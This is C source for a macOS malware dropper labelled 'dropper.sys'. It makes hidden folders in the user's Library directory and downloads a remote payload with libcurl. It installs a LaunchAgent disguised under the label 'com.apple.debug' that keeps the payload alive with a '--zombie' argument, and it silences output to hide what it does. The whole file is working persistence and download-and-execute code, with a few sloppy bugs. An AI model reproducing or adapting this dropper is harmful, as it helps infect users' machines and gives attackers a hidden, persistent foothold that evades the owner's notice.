//
//  main.c
//  dropper.sys
//
//  Created by Nikola Tesla on 2/28/16.
//  Copyright © 2016 WireTech. All rights reserved.
//

#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

#include <stdio.h>
#include <sys/stat.h>
#include <curl/curl.h>
#include <CoreFoundation/CoreFoundation.h>

#define LABEL "com.apple.debug"
#define RELATIVE_PATH "Library/LaunchAgents/" LABEL ".plist"
#define METASTASYS_EXECUTABLE "~/Library/.debug/debug-client"
#define LOAD_COMMAND "/bin/launchctl load -w " RELATIVE_PATH
#define START_COMMAND "/bin/launchctl start " LABEL
#define EXECUTABLE "http://127.0.0.1:8080/downloads/metast.sys"
#define METAST_DEBUG 1

void silence_output(int fdIn, int fdOut);
void create_launch_plist(void);
void load_launch_plist(void);
void create_folder_tree(void);
void download_components(void);

int main(int argc, const char * argv[]) {
    int fdIn, fdOut;
    if (!METAST_DEBUG) {
        open("/dev/null", O_WRONLY);
        open("/dev/null", O_RDONLY);
        silence_output(fdIn, fdOut);
    }
    chdir(getenv("HOME"));
    create_folder_tree();
    download_components();
    create_launch_plist();
    load_launch_plist();
    if (!METAST_DEBUG) {
        close(fdIn);
        close(fdOut);
    }
    return 0;
}

void silence_output(int fdIn, int fdOut) {
    dup2(fdIn, STDIN_FILENO);
    dup2(fdOut, STDOUT_FILENO);
    dup2(fdOut, STDERR_FILENO);
}

void create_folder_tree(void) {
    mkdir("Library/.debug", 0777);
    mkdir("Library/.debug/.bin", 0777);
    mkdir("Library/.debug/.plugins", 0777);
    mkdir("Library/.debug/.resources", 0777);
}

ssize_t write_callback(void *buf, size_t buf_size, size_t nents, FILE *outfd) {
    return fwrite(buf, buf_size, nents, outfd);
}

void download_components(void) {
    CURL *curl;
    FILE *fp;
    if ((curl = curl_easy_init())) {
        if ((fp = fopen("Library/.debug/.bin/debug", "wb"))) {
            curl_easy_setopt(curl, CURLOPT_URL, EXECUTABLE);
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, METAST_DEBUG);
            curl_easy_perform(curl);
            curl_easy_cleanup(curl);
            fclose(fp);
        } else {
            curl_easy_cleanup(curl);
        }
    }
}

char *get_output_path(void) {
    char *home = getenv("HOME");
    size_t output_dir_size = strlen(RELATIVE_PATH) + strlen(home) + 2;
    char *output = NULL;
    if ((output = malloc(output_dir_size)) == NULL) {
        exit(EXIT_FAILURE);
    }
    memset(output, '\0', output_dir_size);
    strlcpy(output, home, output_dir_size);
    strlcat(output, "/", output_dir_size);
    strlcat(output, RELATIVE_PATH, output_dir_size);
    return output;
}

void create_launch_plist(void) {
    char *output = get_output_path();
    CFStringRef output_string = CFStringCreateWithCString(kCFAllocatorDefault, output, kCFStringEncodingASCII);
    CFURLRef output_url = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, output_string, kCFURLPOSIXPathStyle, false);
    CFRelease(output_string);
    free(output);
    CFStringRef arguments[2];
    arguments[0] = CFSTR(METASTASYS_EXECUTABLE);
    arguments[1] = CFSTR("--zombie");
    CFArrayRef arguments_array = CFArrayCreate(kCFAllocatorDefault, (const void **)arguments, 2, &kCFTypeArrayCallBacks);
    
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    
    CFDictionarySetValue(dict, CFSTR("Label"), CFSTR(LABEL));
    CFDictionarySetValue(dict, CFSTR("KeepAlive"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("EnableGlobbing"), kCFBooleanTrue);
    CFDictionarySetValue(dict, CFSTR("ProgramArguments"), arguments_array);
    CFRelease(arguments_array);
    CFDictionarySetValue(dict, CFSTR("StandardOutPath"), CFSTR("/dev/null"));
    CFDictionarySetValue(dict, CFSTR("StandardErrorPath"), CFSTR("/dev/null"));
    int respawn = 300;
    CFNumberRef start_interval = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &respawn);
    CFDictionarySetValue(dict, CFSTR("StartInterval"), start_interval);
    CFRelease(start_interval);
    CFErrorRef data_error;
    CFDataRef xml_data = CFPropertyListCreateData(kCFAllocatorDefault, dict, kCFPropertyListXMLFormat_v1_0, 0, &data_error);
    SInt32 error_code;
    CFURLWriteDataAndPropertiesToResource(output_url, xml_data, NULL, &error_code);
    CFRelease(xml_data);
    CFRelease(dict);
    CFRelease(output_url);
}

void load_launch_plist(void) {
    system(LOAD_COMMAND);
    system(START_COMMAND);
}